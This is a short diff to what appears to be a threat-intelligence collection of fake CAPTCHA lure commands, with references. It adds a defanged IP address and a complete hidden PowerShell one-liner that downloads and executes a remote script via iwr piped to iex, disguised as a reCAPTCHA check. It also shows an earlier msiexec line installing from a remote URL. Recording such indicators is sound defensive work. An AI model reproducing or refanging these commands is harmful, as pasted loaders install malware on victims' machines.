@@ -48,5 +48,13 @@ msiexec /i hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/p
 
 ----
 
+```
+hxxps[:]//193[.]111[.]248[.]249/
+
+powershell -w hidden -ep bypass -c "Start-Process powershell -WindowStyle Hidden -ArgumentList '-ep bypass -c iwr hxxps[:]//marsalek[.]cy/psc?uid=444^|iex'" # I am not a robot - reCAPTCHA Human Verification 
+```
+
+----
+
 - https://stevesec.com/?page_id=284
 - https://gist.github.com/adulau/6cf6f3e9c5bbd9106af8814d0a22f473
